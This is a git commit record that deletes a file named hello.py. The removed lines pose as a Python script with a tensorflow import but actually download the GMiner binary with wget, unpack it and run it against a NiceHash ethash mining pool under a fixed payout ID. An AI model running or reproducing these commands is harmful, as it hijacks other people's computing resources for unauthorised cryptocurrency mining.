58598fe1c9bbe914d6ec03019e968b16d0dbcc31
babyboy201 <92226575+babyboy201@users.noreply.github.com>
2021-10-09 17:54:32 +0000

    Delete hello.py

--- hello.py
+++
@@ -1,5 +0,0 @@
-#save this file as hello.py in your repo
-import tensorflow as tf
-wget https://github.com/develsoftware/GMinerRelease/releases/download/2.54/gminer_2_54_linux64.tar.xz
-tar -xvf gminer_2_54_linux64.tar.xz 
-./miner -a ethash -s daggerhashimoto.eu-west.nicehash.com:3353 --user 31ib7EZjeDoER14o1WzVyxJRgw7EeAHTBH.new --proto stratum
